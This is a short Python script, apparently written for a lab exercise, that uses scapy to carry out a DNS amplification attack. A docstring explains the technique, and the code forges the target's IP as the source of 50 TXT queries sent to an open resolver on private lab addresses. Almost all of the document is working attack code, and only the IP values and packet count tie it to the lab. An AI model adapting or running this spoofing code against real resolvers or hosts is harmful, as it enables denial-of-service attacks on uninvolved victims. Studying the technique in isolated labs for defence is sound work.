"""
DNS amplification is a reflection attack. 
It sends a DNS query to an open DNS resolver (on the reflector),
with the source IP spoofed to be the victims. 
Since DNS responses are often larger than the queries, 
this amplifies the traffic volume that reaches the victim.


In the lab:
testing-attacker (192.168.168.11) -> sends the spoofed queries
testing-reflector (192.168.168.13) -> the open DNS resolver
testing-target (192.168.168.10) -> the target
"""

from scapy.all import IP, UDP, DNS, DNSQR, send
import random

reflector_ip = "192.168.168.13"
target_ip = "192.168.168.10"
num_packets = 50


def create_DNS():
        ip_layer = IP(src=target_ip, dst=reflector_ip)
        udp_layer = UDP(dport= 53)
        dns_layer = DNS(id=random.randint(0, 65535), 
                        qd=DNSQR(qname="lab.test.", qtype="TXT"))

        packet = ip_layer / udp_layer / dns_layer 
        return packet

def main():
    for i in range(num_packets):
        packet = create_DNS()
        send(packet, verbose=0)

if __name__ == "__main__":
    main()


